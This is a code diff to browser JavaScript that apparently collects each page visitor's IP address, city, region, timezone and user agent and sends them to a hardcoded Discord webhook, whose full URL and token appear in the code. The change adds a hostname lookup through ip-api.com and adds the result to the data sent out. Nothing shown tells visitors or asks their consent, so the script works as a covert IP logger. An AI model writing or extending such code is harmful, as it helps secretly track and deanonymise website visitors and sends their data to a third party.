@@ -43,8 +43,15 @@
     return navigator.userAgent;
   }
 
+  // Function to get hostname from IP using ip-api.com
+  async function getHostname(ipAddress) {
+    const response = await fetch(`http://ip-api.com/json/${ipAddress}`);
+    const data = await response.json();
+    return data.hostname || 'N/A';
+  }
+
   // Function to send data to Discord webhook as an embedded message
-  async function sendToDiscord(ipAddress, locationInfo, userAgent) {
+  async function sendToDiscord(ipAddress, locationInfo, userAgent, hostname) {
     const { city, region, timezone } = locationInfo;
     const webhookURL = 'https://discord.com/api/webhooks/1197340200276344852/oMGzClEWwTYkBG9qF0UYTdcqvCnfZPDX2JhCtc1B0gT5LZmOCyPxBtRwIcIOSIW4lpZY'; // Replace with your Discord webhook URL
 
@@ -61,6 +68,7 @@
                 { name: "Region", value: region },
                 { name: "Timezone", value: timezone },
                 { name: "User Agent", value: userAgent },
+                { name: "Hostname", value: hostname },
             ],
         }],
     };
@@ -81,7 +89,8 @@
       const ipAddress = await getIpAddress();
       const locationInfo = await getLocationInfo(ipAddress);
       const userAgent = getUserAgent();
-      await sendToDiscord(ipAddress, locationInfo, userAgent);
+      const hostname = await getHostname(ipAddress);
+      await sendToDiscord(ipAddress, locationInfo, userAgent, hostname);
     } catch (error) {
       console.error('Error:', error);
     }
